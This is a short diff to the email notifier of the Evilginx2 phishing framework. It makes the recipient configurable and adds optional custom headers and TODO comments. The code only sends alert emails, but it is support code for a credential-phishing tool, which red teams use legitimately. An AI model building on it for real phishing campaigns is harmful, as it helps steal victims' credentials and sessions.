@@ -78,16 +78,23 @@ func NotifierSend(n *Notify, body interface{}) error {
 		// TODO create vairables for all of this?
 		m := gomail.NewMessage()
 		m.SetHeader("From", "phishing-notification@xxx.xxx.de")
-		m.SetHeader("To", "xxx@xxx.de")
+		m.SetHeader("To", n.Url)
 		m.SetHeader("Subject", "Evilginx2 Notification")
 		m.SetBody("text/plain", bodystr)
 
+		// Adding additional Headers from the AuthHeader Config. Not necessarily for auth, but who knows what this might be useful for
+		if n.AuthHeaderName != "" && n.AuthHeaderValue != "" {
+			m.SetHeader(n.AuthHeaderName, n.AuthHeaderValue)
+		}
+
 		d := gomail.Dialer{Host: "relay", Port: 587}
+		//TODO STMPs auth
 		log.Debug("Mail Notification sent")
 
 		if err := d.DialAndSend(m); err != nil {
 			log.Error("Notifier E-Mail failed. Panic")
 			panic(err)
+			//TODO dont panic so hard to make it crash!
 		}
 		return nil
 	}
